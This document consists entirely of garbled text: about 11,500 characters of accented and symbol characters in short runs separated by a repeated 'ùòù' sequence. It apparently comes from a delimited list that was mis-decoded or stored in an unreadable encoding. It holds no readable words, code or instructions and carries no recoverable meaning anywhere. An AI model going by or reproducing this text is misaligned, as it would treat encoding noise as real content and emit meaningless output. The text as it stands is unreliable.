±µíùòùæµ±µ¼µ¤õõê¿ùòùëé¤ùòùèº½æ±ê®½¿ùòùæµ¿±µ¼¹¹è¯ùòùëé½æ±¸¨ùòù¦±©ê½¿ùòù½¯¶ºùòùæµõ¤±µºµõêùòù®½æ±¨«±ùòù¸­îõ³ùòùæµ¼±µ¼½§ùòùé«í«®¶µèµ³±ùòùíºùòù½½æ±²êªº¸ùòùñºæµéùòù·«í½æµ¨¦¦½æµ¹¦æ±ùòùæ´±µ½±µùòù§æµ¼ùòù¦¤«ùòùæ²­©õõè¿ùòùæ²µ½½î¤îùòù°µ¯´µîùòù«¦³éªºùòù»±­æ±´ç¶º«³ùòù¶µ¿³µ­µ°¶±¦æùòùèªºæ±©ë¤éùòùæ´½µ½ñ½í²§ùòù´¦¨¿ùòùæ§ìõµ¿µ§õéùòù«µ§¶¯ùòù§±íêñºæ±ñ¿µ´æ±ìùòù®¹­¤­º«¿ùòù´¸ñ½µ¬èùòù¯±ìèº«ùòùé¶º³±¯è½éºì½ùòùéé½æ±³´¨ùòù¯³±éé½»ùòù½°®¼¦³µ«ëíºùòù½æ±ëùòùºæ±ª¿±ëùòù®¬»¶ùòù§³±¶èé½¹îùòù«±êº½í¼º¿ùòù§¨±ºº¿ùòùæµ±µ¼µ¤±õê¿ùòùª³±é¦½ªºæ±ê¦º±ùòù¹±°ùòùæ§±µ¼µõë¯ùòùëé½³±«êùòù½¬«ùòù©¹ë¦ï«ùòùªªê¯¼ªêùòùæ´ì¤õë¿ùòù¯ï¼¹­«ùòùª±îùòù½²ùòùæ²èµ½ñ½§ùòù½¦ºæùòù·ì¨½¯ùòùæ§ì±µ¿½§»ùòù®½¬ºæùòù¿³µê¦½µ¬ùòù¸µ½êé½æµùòù±±¨´æ±ùòùæµ±õµ¿µõõéùòù¦½¨õ¿ùòùëé½±®º¯ùòùéí½±±±«ùòù¼³±±¯ùòù­æ±õé½í¯ùòù©·ùòùë½±®¨æµíºùòù¿½µ°é»ùòùæ±èéí½ùòùµ¹»§­¯ùòù·³±«ñùòù±¤êé½¦êùòùêé½±ªº±¦·±ëé½ùòùèí½æ±§íùòùëñ½æ±ªº±¹±±ºè®½¿ùòùº½³±±¬±ùòùºî¬ùòù«±ñêº½ùòùæ²µºµ¼®½ùòùéí½±ëê²½î¸®¯ùòù¼¨ª¸·ùòù¸µ´½½é·¿ùòù¤³ª­§ªùòù½³µæ±î«ùòù§¯¬µª³³ïë½µµùòùµ¦³»ùòùºæµêé¶¿ùòù®ìé½µëîùòù´æµõê½µùòù«±æê¶½«ùòùèº­¿ì½¦ë°»æùòù½µ°²æµ§ùòùì¶¦¹îùòù¨³±èé½íñºæ±½³±ùòùæ´õ±õë¿ùòùæµíµº½íµùòùé½æ±¬èñ½ùòù±ùòùé½³±·¹»ùòù·ñ§æµ½¿ùòù«³±èª½ùòù±·¹ñ½¿ùòùéñº²ºæ±¯ùòùéº½æ±çé¿ªèº³±·µùòùë®½±­³µéùòùèèª½¶ùòùîçæµª¸ùòùêª½±»¯æµùòù³µ¨¼¦«¯ùòùæ´¹µ¼½§æùòù¦æ±ë®º¸ùòù¶±¯§³ùòù½¯§ùòùæ±©±½ùòù­±ë½ïëêùòùæ§­¦±µ¿±µ±õë¯ùòùèº½±çè¿èºº±µµªùòùë½æ±­µ·ùòù¿¬½¿ùòù½µ¶±¦éºµ¯ùòù­­¬¨µéº¼¿êùòùæ´¹©õµ¼µ§õéùòùæ²è±µ½µ±õéùòù±¦êºï³ùòù§±­¼º½ùòùæ²µï±µ¼±µõè¯ùòùéº½³±²¤»«ùòù²±­±±»ùòùæµµõµºµ±õè¿ùòù½æ±ùòù¯èçì¶ùòùº³±éñº¨ªº¸ùòùª½º¤¹ùòùæ´ì¼±µ¿õµ§õêùòù¦º¸¿ñê¤ùòù¨³±ê½ï°º½ùòù§ï§æëºùòùéª½±¨·³éíº¯ùòùè½±³è¦½ùòù²³µè§µé§°º«ùòùê°êê©çê­·êê©¿ê­®êéùòùµæ±ºæªêùòùª±æè½¹ùòù»ë´ç±³±»ºæµîùòùºíéùòùæ²ìµ½¹´»ùòù½º±¨±¸´ëµ³µùòùé½¼¨¯ùòù¼³±¨±ï»ùòùè¦ºæ±íêëªùòù©¸¿ùòùéºªº±»ùòùè¦½±±´ï¨èùòùº½³±éªæ±®ùòùêº­º±ùòù¦½±°ùòùê®½³±æµùòùº¹½³µºéõ¨¯ùòùïç¿¯ùòù½±¿©½©î¶»¿ùòù¿µ·æµ¯ùòùæ«³æµ¤±·ùòù³±µ¯§ùòùëªºªº±·ùòùè¦½±°¶°½éñºî¨½ùòùºîç¯ùòùæ§¹ì±µ¿µ¤õéùòùêº½±¬ùòùêºº«¬·ùòù©³±¶¶¼½¿ùòù²»º½µùòù¦½¨°îùòù«æ±³ëé½¨«ùòù±¸êº±ùòùê®½±¯é½¯ùòùæ§íµºµ§õê¿ùòù¼§¼ùòù©æµç¦¿ùòù³µ¨¼¯¦±é§¼´íêêùòù§¦ç°®¨³ùòù»±ùòùéºµé½ùòùæ§¼±µºµ§õõê¿ùòù½³±¯ùòùêºº±°è¼ùòù¼©½µìëæùòùªºæ±³¦ùòù··ªµ½éººº¿¯ñùòù±²èºêùòùï«é½ùòù¸íñ½µ­è³©ùòù½³±ç¯¹ùòù®î®½³±­ë»ùòù¦½±ùòù¶çæîùòù´±¤¿ç§ùòùèª½³±îºùòùæ§íµ¿±µ§±õë¯ùòùæ±¯³µ­»¼µ¯ùòù½½ùòù¿æ±­±ùòù³±ê¦º³±ºùòùéé½æ±çëñ½»ëî®³µ½êêùòù§ëç¼±¹¦ºæµñùòù¼æµ¬¸µ¶¯¬º½±¹ùòù¸çêùòùºì§îùòùºæ±¤êº«º©§ùòùéëí½»³ùòùè¶½±æ¯¹îùòù°ì¿°ï·ùòù¼éº±­ùòù¬¹·î·ùòùé½ïçùòùæ§µ»õµ¼µõë¿ùòù±¸ùòùé¶½³±¶èí½¿ùòùê¦½±³«íùòù¦æ¬ëº¯ùòù¶½¶º¬½¯ùòù«æµ¦½±©ùòù»½æ±©ë»ùòùè²ººº³±¸ùòùª½¿¬ï¹ùòùæ²õçõèùòù·²·ùòù¶±³±¦ùòù­æ§»¯·ùòù§ñêæùòù¦­ê²±¯ùòùèº»ùòù»ë¼æ½æ±»º³µùòùµ¤¼ùòù¿æ±³ñ«º²º¦º¯ùòù°ìé½³µëæùòù¿°°§ùòù­»¼°ªùòùêé½±·¦«ùòùéº±ëé´­ùòù³ì´é²½«»¼·ùòùêèé²¦èíº³±¶­º¦ºùòùêºº§ùòùé¨²ùòùè¤µê¦½ùòù¦±ê¦º±ùòùªºæ±¨¿ùòù¶æµé¦½æµùòù»³µ¬½µ½ªµ»³±¬ªùòùê¶½±©º½»ºùòùº³±­íëùòù½ªíº¿ùòù³¯îí½¯ùòù­»ïí¸§ùòùèí½³±êñ½¯ùòùº¹î¿ùòùæ±éº±ùòùí½±ì¬±«æ±·ªæ±·¯ùòù»®½±»¨°æ¿ùòùé®½±æ­¦îùòùùòù®ì¬¤¿ùòù¼æ±¯»ùòù»¨«½¿ùòù´ìí½æ±¶êùòù¯ï´»î»ùòù½±ê¤ùòùè½±¶¦«½éêùòù³±²±îæùòù¤³±çéº³±æùòù½±©ë½¨¼·½¯ùòùºªæùòùë¸í¯íº¨ººùòù·²¨½î¸é½ùòù·¶¶½³±©ê²ºº³­§ùòùæ§îõµ¼±µ¤õéùòù©ìêêºùòùéºæ±¬èï§ºº½«³ùòùê½±¿ë½¯ùòù°½µï§ì½æµ°ùòù¹¶í½æ±èùòù«´ìºí½½¯ùòù±é½î«ùòù·±ïêªº³±º³µ¨æµ·ùòùêñºº¦º¶½³µ¬±±®ùòù©³±ï«¶ç¬³µ¸±ùòù¦ºæµééùòùëº½ñº±é¤±®»¯ùòùæµ¼±µ¼µ¤õê¯ùòùèñº±¸¬½®½³±¿¨êùòù¦½µí¹ì«ùòùºæµéé¸½ïºùòùª½ë­¶æ±æî»¿ùòùæ´²µ½õµõèùòùª½ë§ùòù«ªºæ±¬±ùòù¿¸ª»»ùòùë¶º³±®ê¼ùòùè½³±ê¦½ùòùë½æ±ë½¿ùòù¬¯½»ùòù«±´½ùòùè½³±±¼¼ëéé½¿ùòù©µéº»íê·´¯ùòùèº±§ê¨íùòùé½±é½ùòù¼±©±®ùòù¹±½³ñ«ùòùéí½±®»§ùòù¿é¸«¼¿ùòù±¦µ¨«±ºî´ùòù½æµ¸¹¿ùòù±²æµ¯«ùòùæ§­±µ¼½ëë§ùòùæ²©©õè¯ùòùºº«»îë¬§ùòù¨æ±»¿¼í½ùòùº½ç«ùòùêé½±ªº±¿·ùòù¬±¼èí½¨ùòùêªºº³±³ùòù½½ùòù³±ºéº±»ùòù³µæ´¿æµ³ùòùæµ¿°µª±ë¯¿§ùòùéº³±°è»ùòù½¬¿ª¿±ùòù¿¸²ºµï¬¹½³µ«±èùòù¦½³±é¨±ùòùë½æ±¿¦µ¿®º¶ê§ëùòùë½³±èé¿éº¿ùòù¤õêõµ¿¿ùòùëí½æ±½º¿ùòù½îººùòù¶º³±··¬ëº«³ùòùë®º±õèùòù½æ±«±¬±¬±¶¬ùòù½ªºñ½µ·ùòù·½³µëùòùèé½³±ñº¿ùòù³éµ­±¿ùòù±õèº¿ùòù³µèº½¯ùòù±í­¯ùòù³³µë°·ùòùè½³±¹ë·´ùòùæ²¬õµ¼½ªùòù°ìêùòù¯«¯ê¶º¯ùòùºµíé±½¿ùòù±çèñºí¯ùòù²ºæ±¹²ùòùë½æ±´ëùòùëí½±¬ï³ùòù´ººé½é½ùòù«±·©°«µñ²±ùòù·¶½±¹èº¯î»¯µùòù¦½æ±©ùòùñ½µ­¶ïíº³µ´ùòùè­µ¸ùòù¯³±¬ùòùº±ñé²½¶ºæ±ê¦ºùòù²º¿´³ùòùè¶½±«è»«ùòùê³¬µ¯²¿ùòù³µ¿ïµ±æùòùêº½æ±î®º±·³ùòù¤ç¿«µùòùé½¦º¿ùòùæµ»±º³±´º¿¦½¿®½¯ùòù´¯§ùòù±º±¯±ñ´µñùòù¼ººùòù³±æµ±ùòù°¶ª½æ±îèùòùë±¨´ùòùë¬µ¯ùòù±¬æµ½ùòù¶½µ¿¼î¦º³µ¯¼ùòùªæ±½©³µ¯ùòùæ±ëèí½î§ùòùê¶½±µ¸ùòùæµ¿µ¼µõê¯ùòù½¿¬é§ùòùêººº±·ùòù½æ±ºê¯ùòù½æ±­è«ùòùµæ±·¹±½îùòùµ¹¶½æ±ë«ùòù§íæùòùéñ½æ±²ªµ²½ùòùê°¼ïùòù§î¨æ®ùòùé¦º³±§é°ë¦º§ùòù³³±´æ±¹ùòùºæµé¸©½í»¹½»ùòùíº¨ùòùêª½æ±½³¸ùòùº½ëéîæµùòù¼±ç©±µç¶ºùòù³±ê«ë¿ùòù¶µ¬»³µªµùòù¸ï¶ùòù¸æµé²½µùòù¼é´¹ùòù²º»¶èº¯©±·ùòù½±³±´ùòù¬³±ç¯¿ùòù­«²®ºùòù³±ëéºæ±ºµ»æµ§ùòùæ§±µ¿±µõëùòù«µ°©¯ùòù¯±ëê½ïùòù¤±»¯µ§¯ùòùµ¼¤²¤±ç¿¸é³ùòù¸æµ²¼´ùòùë¶º½²º³±«©³±»ùòùîê¿èºùòù®ïí½æµºë»ùòùë²º­éº³±êîñª±ª¿ùòù±·ê½»·ùòùêª½æ±éñ½¯ùòù´¨¿êùòùèé½æ±èéñº¿ùòùµ³¤¼©±æ¿¤½ê«ùòùæ´¨µ½®¹±îùòùæ§ìõµ¿µ§±õéùòùº¼ê¿°ùòù­¶¸·ùòù³±¦µ»è¼±®î­²¯ùòùæ§±ªõµ¿±µ±õëùòù¶º¨¯«ùòùæ´õµ¿¹¶³ùòùèñ½±­¿êùòù¯±ë½¦³ùòù§³±ì¿¼½¹³®ùòùé²½±³³ºé®º¯ùòù¦æ±îéººíùòù°µ©°»´¿ùòù³µ§ùòùæ´¹çõëùòùíº¹³ùòù®º±­êº¹éº¨îùòù¹±ë¦±¨±º¸«ìùòù¿©¹¨·ùòù³³±´·±îùòùè²½±¸¤¸·³éíº¯ùòù²½½ïºùòù»¿«¸ùòùí½³±ë¬±®§³µ´ùòùµõéõµ¿¯ùòù³¶§¶½¦º­ºùòùµ¤«ùòù·©§­®½¦º­ºùòù­«ùòù¤¬ê¯ùòù¶¸½æµ½éùòù¦±¯éñº¸¿ùòù¬¬¸ùòù¨±´º¼ùòù¬´°°©·ùòùéª½±¦«±éº»³¦ùòùª¨µ¶¯§§ùòù¶¹é½µªëîî­¹½¯ùòù±êªº³±¹µµéùòù½º±¯ùòù¶½²ºêùòùê¼µé¶½©ùòùéñº¦³èªùòù¸ë§ùòùæ¼¿ùòùª¹îêºùòù¦±ëêº³±´ùòùë½±®¦µº½«¼êùòùé¶ºîé¦½ùòù½µéñ½¶º±¦½±çùòù¿³µ½µ­¤µæ¸æ±«­ùòùæ±ëº¹ï¯¿©ùòùêºº³ùòù¼¤«í½¿ùòù¶¹í¯ùòù©³µ§¿ùòù«¯¶½¶¤ñ½ùòù¨µº®º¬¿²»·ùòùêëµ½©°ùòù¦½³µ¹«ùòù¦±·º¿½ì«²ùòù»æµèª½³µêùòùèº½³±îùòù»¦º±ï³±¬¼æµùòùæ±«³µ°«½µ¯ùòùé½æ±·¤ùòù¶æ±¸³°ùòù¨êºùòùèºî¿ùòù¿¿õ³ªùòù®½±¬æ±ùòùµªùòùæµìõµ¼µ±õë¿ùòù¤ºê©±­²º¼¯ùòùºµ§¼ª®¿ùòù²½ìººùòùè½ï»ùòùéª½±«ùòùæ±îéº¹î´µùòù¶ªº±ª¯ùòù¬±§­µ³ùòùæ±ë¨µªùòùº³±³ùòù±¹¯¤®½¦º­ºùòùæ´¨µ½±µ±õê¿ùòù½±¨º¨¸éíº¿²ºùòù¨³±³µ·ùòù¬æµ²¯ùòùêçé¶½æ²©æµ¸±¯³µ´ùòù¤³ëªº¯ùòùæ§­µ¿®½¤·ùòù¸µèñ½³µùòù®º¸ñùòùæµ±æõëõµºõµ¤õéùòùè¦½³±ùòùª±õè®ºæ±°ùòù»ñ½³µ¸§¿ùòù½æµé·°ùòù¤³±é®º³±ùòù±·«ùòùè²½±«ìùòùæ²µºµ¼®½é»ùòù¹ééº¿ùòù¶½¦ºùòù·¯³µ¨µ¼îùòù¶³µµç·´ùòùéº±´èùòùêé­¬éééçæèºæµ´±ùòùîîùòùª½ªñº½æµ²éùòù¦½³±±¯³±ùòù±¹ùòù³ï²½µ­¨ººµ­æ±õùòùµîª½µùòù·»ïêï·ºë¯ùòù½´·ùòùê¨±¿ùòù¨ìêºùòù¬³±ë½ï³ùòù½ª¦½ùòù²½­´»¯ùòùé½³±¸¹ùòùæ§¨µºõµ±õêùòù®½¶º³ùòù¿ë¬·¿ùòù¤±é½îùòùéç°®¨´«ùòù¦»¹¿«ùòù³±é²º»»ùòù¶ºµ¨èçùòù¨æ±é²½ïº±æ½³±ùòùë½±ºùòù¸º±¨³±ê¤²ùòù¬¶¿ùòù³í§µ³³ùòù¤°§ùòù¯ê§µ±®¯ùòù·¯¹·ùòùêë´³ùòùæµæ±¯ùòù¯·§§ùòùê¶½±©¶½¼¶¿ùòù¯¤¦í½¿ùòùéª½±µ²©êùòù±éè½«ùòù¬¯·ùòù½±æî²ùòùñ½±½ºùòù²æ±îùòù½ï»ì¿ùòù©¹«¶¯ùòù¹µª¼µ¬ªµ«¿±««ùòù¸±ª³±ùòùë½æ±çê´ùòù¶ºµñé¿ùòùè¦½±·ª§ùòù½æµ³¨êùòù¯ºë¬í¶¯ùòù¯­¨½¯ùòù½±ª¯³ùòù¿«ñ½±¹è»ùòù¤æ±ñ½ïñº¨µùòùµ¦°º¹º«²ºùòù³±¦µ¨¨±¼î©µùòùæ´ììµ¼µ§õë¯ùòù½±æ«±ç¦æ±®¨¿ùòùê½æ±¬«ùòù·íµ¿³¯ùòùê©é¶ë¹¨éº¬¸²ºùòùëñ½æ±²ªµ½º¹îëùòù°³±½²¿ùòùæµ½¬±«¿ùòù½¼íºæ±§ùòùë¦½³±ëëéùòù½½îõ§çùòù½æµ¸®¶îùòù®±æ±¸ùòùµ¨î¬©ùòùè½±·¸ùòùè°©¤´ùòù¦½½¼¶¼¯ùòùª½¿ë³ùòù¯³±³ê¯ùòù½µ°¿ùòùñºµ§éùòù¨±êª½¶º¼ºùòù²¼éº³±«¿ùòù½µ¶°®ùòù¸¬·¶ùòù±éùòùµæ±½²±»ùòù¸º±±¬µæµùòùµº±§¦ùòù½³±é¨æ±¶«æ±¨­³±¯¿ùòùª½¼é§µîº¯ùòùé¶½³±¶èí½½ººùòù¼±§§ùòùëñ½æ±ªºæ±½ùòù·µº¯ùòùè¸º»°¨ùòù¨§¯ùòù¬³±­ë®º¨êùòù°³µê·ùòù¹ï®½±»ëùòù«±ñ±®½¿ùòùê½æ±ªµº¯ùòùê¦º½éº±êùòùè¸®èùòù¦°­·ùòùî´é´»éºí½¦½ùòù½±­æ±¸©¿ùòùè¨¤èñ½ï®½¦îùòùè´è¦½¦êùòùæ²»±µ½½îùòù±½«µ»ùòùº½±ª«³±¹ùòù´ìí½±¨èºî­·ùòù±èéº¯ºùòù¸æµñé®½³µê§ùòù»³±ï­æ±ùòùè­µ¸¬´ùòùºæµèï½¦ùòùéºµéì¯¶¼­ùòùæ´µºõµ¤±õêùòù©©ï»©·ùòùêº½º³±ùòùæ²ì¬õµ½µ±õê¯ùòù»õèµ¼ùòù²«¶½µìë·ùòùé¦½æ±ìè³³éº±½µ¯ùòù½ºîæì¯æëµùòù­½»½³ùòù¿µé¯ùòùñºïæùòùèºæ±é´ùòù¦³±ëíºïùòù»ë¨è¿æ±¼«¦ºæµùòù¶¨¶½±¸êùòùéº±èê±ùòùæ§¼µºµ§õõê¿ùòù¶½æµ³ùòùé½±îùòùê©­´®¹®²½¸¯ª½¯ùòùé½±®¦µ²ùòùé§¿§º½µè³µ«ùòùæ²»µ½µõéùòù»¬¿ùòù´æµê¬¤¼æµ¸¦¿ùòù¿³±«±¤¨ùòùº½­ï®¿ùòù«æ±³¶¿ñ½¯ùòù¯±¯ëéº·ùòù½¶º¯½¯ùòùèí½æ±õé»ùòù®±¦«ùòù»³¨µ¤ºê½¯ùòù´ì¿¤½¯®ºùòù¼±±¯ùòù±èñ½«ùòùíº¼°ùòù²î¯¤ªéº»ùòù½æµè³¸»ùòù§í½ùòùæ´õµ½ñ½²êùòù¼æµê½µëùòùé½æ±³ºùòù­¦·´éº¿ùòù¦±ïé®½¸ùòù³ºº³±¿ùòùê¶½±º¿ùòùê®ºªº±°ê­±»ùòù¸«½æµ¤ùòù¯±¯ë®ºùòùñ½µñ±¶³ùòùæ²­ïõµ½µõèùòùº¯ùòù¶³±«¿è¿¦º¹ºùòù½µ¶¿¦éº³µùòù¬©¸«ùòù¿±«ùòùé·éí½½«ñº¨º¯ùòùé½æµ¼¹ºùòùë¦½±µ¦ºæ±°æ±¼ë«ùòùëé½æ±ªº±µ´±¨ë¶½ùòù½¦ºùòùéºº³±ªè¼º¶º½êùòùæ´µªµºõµõéùòù¿±»²æùòùº·ùòù²½¯¤§´ùòùë¶º®º³±ùòù§±¹º½¿ùòù³­¦ºæ±ùòùº±«æùòù¼æµ¶º³µ«ªùòùæµ±µ¼±µõé¯ùòù­¸°·¶«ùòù¿¨½³±ì¹¿ùòù»³±­·³±ìîùòù»±³±ñùòù½µ¦¸º³µ·¯¿ùòùæ±ñ¬æµ±·º²¬¼ùòùª½±­¬³±ëùòù¹µë®½µùòù¸³µèñ½³µ¯ê©³µùòù¸ë®¸®º¶½¼½ùòùèº½±çè¿éº±·µ¹ùòùºº³µëé½·³¼ª»ùòùæ§´µ¿±µ§±õë¯ùòùê²½æ±¹«§ùòùèï»¸ùòùë®½±è»ùòùí½³±ë¬±®ùòù¶æµêèí½³µ¸­¿ùòù·©±¦ñ½¿ºº¿ùòùè¶º¦½²½µè¶½¯½ùòù¿­«æùòùº¨ùòùê½³±ê»²ùòùë¶½æ±­º¹ùòù¨æ±®¹í½°½¯ùòùé½³±ë©ùòù°­ïº»æºê¯¹ùòù½½ºº·ùòù®æ±ç¤æ±ùòùê¹¿ùòù¯±®ºï§¶ùòù½¬¬ùòùª½¹ºùòù´µª»æµùòùºº³±±ë¶º¨º«ùòùé¹®«ê¯ùòù¦«ë«ïùòù®º±æíê¶ºîéºï³ùòù½æ±¯²ùòùê¦ééæêµëêééùòù¤ª¼¿±ùòùæ´õµ½ñ½é·ùòùè½³±´¹¨èùòù½ºîê«ìùòùéçñé½¯ùòùêº½º³±íùòù½º®½±¯±³±»ùòùí½³±ì¨±®ª±®±¶¯ùòù­è¿ùòù¿·é°¼¯ùòùè½±îµé«ùòù«©ëª¸¿ùòù­æèªºùòùëë©ë½ì»ùòù«µì¸ùòùë½æ±¼ªµ²ºµêùòù¬æ±êéº¦ùòù·µé¶½³µùòù°¶±¯ùòù¹ê¤èºï·®ùòù¤©»éº«­±·ùòù°»º½³µí¦ùòù¨±êª½¶´º¨ùòùæµ·µ½µõê¿ùòù©³±½°§ùòùæ§ïõµº±µ§±õéùòùæ²õµ½µ±õë¿ùòù¼¹·®¸îùòùæ±´¿¶½¯ùòùè½±ë½¿¼®³±ë§ùòùº½±§¿­ùòù½µ³ùòù¿æµ²¸æµ¤µê½±½ùòùè½±¤¦«½éêùòù½±¬²½¶¹¿ùòù¤æ±éê®ºùòù²½æ±¹õùòù©³±´¼ñ½¦ê´²½ùòùéí½æ±µùòùêª½³±ñº¿ùòù±¬æµ«³ùòù»»é½æµùòù¦±¬½³µ­±ì»±ª°¤ùòùæ§§±õêùòù½íº¯ùòù­±º¹¼¦½¯ùòù¿æµ¬½³µùòùæ§µõµ¼½¯¿ùòù´¦¶½æ±éæùòù»¦§¶¯ùòùæ±éêùòùëª½æ±õê½ùòùæ±ñ¿¿ùòùééºªº±ùòùµµ¼æµï¯ùòù»³µ³µ¹ªæµê»³±½ùòù¦±®í½ùòùé²ºªïùòù½±·¯ùòù½³±³±²©æ±ùòùñ½­´»¿¿ùòùèªº²º³±°ùòù¦·½èíº¿ùòùºæµºèëºì§ùòù©³±±éíº¸ùòùè±½©ùòù±ë«µ¹«ùòù¯·¤¹»ùòù¸¦º±­æ±¬´µùòù½¹»ùòùæ§õéõµ½µ¤õõëùòù¨æ±ë½¸¤²º­¨«ùòù¼³±¯æçùòùëñº½ºùòù®¹§¶½¶º·ùòùæµ¬¿«±ùòùµæ±¤¿³ùòù¿¼ëï»¿ùòù¸ë§¯ùòù¼µ¨êé½æµùòù»¦ºæ±­³±¹´±µùòùèº½·éêùòù³ººæ±§¯ùòùæ´ñõµ¿±µ¤±õê¿ùòùéèê½«ùòù³­½ìõ·´æµêùòùê²ºùòù¹³±«»í·éº¹·ùòù½­íºº½æµµé½¼ùòùæµ­¦±µºµõèùòùëí½³±¶¨¿ùòù°©½³±é¯ùòù·ï¶½æ±ïè»ùòùéé½±¤¯³µ¼ùòù­³±èº³±ùòùëªº¦º±¯«¯æ±ª»ùòùº»æ·îùòùê®ëï¹¯ùòùæµ»ë°¯¿ùòùíº³µé¨ùòùº»êè­¼½¿ùòùé¶ºªº±±ùòù³î¸º½¦§ùòù®³µ©°·ùòù¿³µ¨é²½³µùòù®º³±¹³¶ùòùª±´µ®ùòù¶½³µ¼ë³ùòùæ±ªæµª²¿ê½æµ±ùòùæ§õ¸µ½µ¤õëùòùæ´õµ½¹¿îùòùë®º»¶ùòùæ²è­µ½®½îùòùè¤¸êùòùª±õê±µ¿ùòù¶¤ùòùëª½³±ºùòùéº«ùòù¶½¶º¯ùòù»µîë¦½µ­¿ùòù­··°¼º¿ùòùè½³±¿¸¨¯èñ½¯«ùòùë®º®ºæ±´ùòù½­²º½æµ¨è½¯ùòù¬æ±é²½í®º³±é²½æ±ùòùèé½æ±õé»íè¶º±ùòùª½ºº§ùòù±¯µ¨¸´¯¯«²ùòùéº«·®êùòùººµïèëõùòù»ê¬¿¿¿ùòù´æ©ºùòù¯­ëµ´¿ùòù¶±¼»ùòù·¦½³µëùòù½½íº±¯¯ùòùêï½ïì³ºë¯ùòù©îºèººùòù½³±èùòùè½¶º¦½±­è¦ºæùòùê²½æ±æµ±ùòùéº»§é·§¬½µîùòù¿³«µ»æçêêùòù¸ºæ±³§ùòù±éºìêùòù¶©½µªéææùòù½î½µì¿ùòù¨±µ¿­é½¯ùòùº³µëé¿¯ùòùéºæ±´ë°ùòù³±·æ±ùòùë¨«æ©ºùòùéº±íë¨êùòù¯³µæ¦¼©©±é½³±ùòùæ´õµ½µõõê¯ùòù°¨½µ¤¿ùòù§í¦¨»º½¿æùòù³³µ±ë®¼ùòù§±µ³¼¶½ùòù°»½æµ¤è¯©¹²¯ùòù¶º©¿ùòù¸íí½æ±èùòùéíºæùòùéº³±»é¤ùòùè¦½±é«¤ùòù½¿ºæùòùñºµ§é¹ùòùë½æ±¦³µõ¦ºùòù¹½³±­ëîùòùè¦½³±º¯ùòù§³±éºì³ºùòùæ²è±µ½õµ§õõêùòùè¦½æ±ñé»°éº³±ùòù»¯®½¿ùòù´²º³±²¬ùòùº½¼¸§ùòùº³±ùòù½¹¶ºîùòùº¸±»ùòùëº·§«ùòùæ§µ¼µõë¯ùòùæ´ì¼µ¿ñ½»ùòù«æ­ùòùéíº­æïñ½©¸ë´ùòùë½³±ªº¿ùòù¯æ±º³±ë¦³µë°êëº¯ùòùêììëêêè½¶»ùòù­æ±ïè®½«êùòù±éñº³±½µª¯ùòùëè¦½ìùòù½µ¸ìêùòù½³±êùòùñ½º¯ùòùêê¤ê­ê©³êçê©ê­½ê©êê¬ùòùëñºªº³±§ùòù¦½ï¤´±æ¨¸¨êùòù¶³±¼µùòù«³±çæïùòù¨³µ½ùòùæµ¬¦ùòù°æµ½¬·ùòù¬æ±ùòùêí½æ±³ª³µùòùéº½±¿¿ùòùé¬µ¶³ùòùêºº³±§¯ë®½¼»¯ùòù³ï¦½µ¨½µ³ùòùæ§íõµ¼±µ¤õéùòùè½³±¸ùòù¤¶¶éº»ùòù³±«µ¸§®·¼»±¯ùòùï«³îùòù³±õêñº¦î»½ùòù¶µ½µ½¯µì½±½ëñùòùª±ñè½ï´º¿ùòù½­íº¬·ùòù«½ùòù½ºªêùòù·¦¤®½¯®ºùòù¸µè®½³µªùòùæµõµºµ±õêùòùéº³±µ®ùòùêé½±­ùòùçª»¶ùòù»³±é«±´¨ºùòùè´ì»ùòù½±­æ±ëùòù«±¸¿¯½©·°¶½ùòùí½æ±ë¨±·©±®»±º¨ùòùæµ¬ùòù®ê­¤¹ª½¬¦ººùòùéë¨é½¨í½ííºïº¿ùòù»æ±´±õùòùí½³±¼¶ñº³µ¤¯·éùòùë¬¶½¦ùòù¸ª«îë¬§ùòùé½µ¿¹»ùòùæ´¹µ¿µõõéùòù±èëñ½îùòùñ½æµµ¿í·ùòù´îí®¯ùòùë³ê½¹ùòùëï¼¸ùòù¦¸èº«­æ´¿ùòùéº¼í½¶îùòù¸¬î§»ùòùêé½µìë½ùòù§í±¯ùòùé½µ¿í®º³µ¤¨¯ùòùñ½æ±«¯ùòùë¶½±¦³µõ¦ºùòù¸º±í­¯ùòù±ê¦º±æ¹³µªæµùòùæ´ìíµ¿õµ§õõêùòùê¸®¬éº³µèª¨¼¬æµç°ï¯ùòù¿µ¼µ­µ½³±½³ùòù·¶½±¹éº»¿ºùòùæ§±µ¼µ±õë¯ùòùè¼µèñ½¸ùòùéººªºæ±¶ùòù½¼¨«½¿ùòù¿µè½³µùòù½±ª±²¨±ùòù±»ë®½¦ùòù¿¤¯±æùòùèõèñ½³ùòùæµ­õéõµºµ±õëùòùê½æ±èêùòù¹³±«æí¯íºì»ùòùéñ½³±íë½»¬®³±êùòùº³±®¬ëºïº¸«ùòùèª½±º»¬éùòù³³µ¦æµ·´´·¬»¹³ùòù³±è½îùòùé¶º¼²ºæ±»ùòù·µè¶½µ¬ùòù½½õªùòùë½±æéìé¦º³±ë³æµùòù¬î«´î¯ùòù½±æ±ªùòù¤ººæµ±êêùòù¹µë²½³µºùòù§æ±«¹®½¯ùòùººæµùòùë®½³±î´íùòù¸»ùòùº½º¤²³ùòù¿³±ï©³±§ùòù¬»¶ùòù·¹¯¸ùòùæ²õµ½±µ±õê¯ùòùºæµ½³µ¦¦º¨®êùòù·±­¯®îùòù®®½³±îèêùòù¦»ç±ùòùæ²­ªõè¿ùòù±¬æµ´ùòù¤í¿§½·µ±¯ùòù«æ±ºéùòùæµ©¸µºõµ§õéùòùê©§®¶½¶»½¿ùòù«æ±ë·¯¬µõ¶ùòù¨±ëº»³ùòùê²½æ±¦ùòùéí½±·º¿ùòùé²ºªº±¹ùòùèª½±«¶¨¸êé½¿®º¯ùòùæ§­«µ¿±µõë¯ùòùë½±®¦µùòù«§«¦½¿í½¯ùòùéª½³±·¦ùòù§æ±èº¨½ùòù²½¹ºñ½æ±«ùòùî¨¿ª»ùòùé½³±¸ê¶ùòùº³µé¸ùòù³±æµë»ùòù´¨®½µ¦ùòù³³µë·ùòùè²º­í¦½©¸ë´ùòù¸°í·¶¦º½½¿ùòù®½«±¿ùòùê®½±¦³«³ùòù¸·¦êùòù³½µª¯ùòùêª½æ±­µ¶ºùòù²±½°³±«§¿í½½ùòù»©®½¹í½¿ùòù½¶º±°ùòùéº±è¼éºîº½³ùòùè½³±éîé§ùòùæ±ñ¬æµ±·º²¶´¿ùòùè²½±³ªµ«ùòù«ª§³µ¿ùòùºæ±©ê¤ùòùºé½³µ§ê§ê¦¨¹ùòù½³±ªêùòùº±²¯ïùòù±»¯­·ùòù²«ª½æµª©¶½¯ùòù°½¼ùòù½íº¯®½³±«ùòù¼í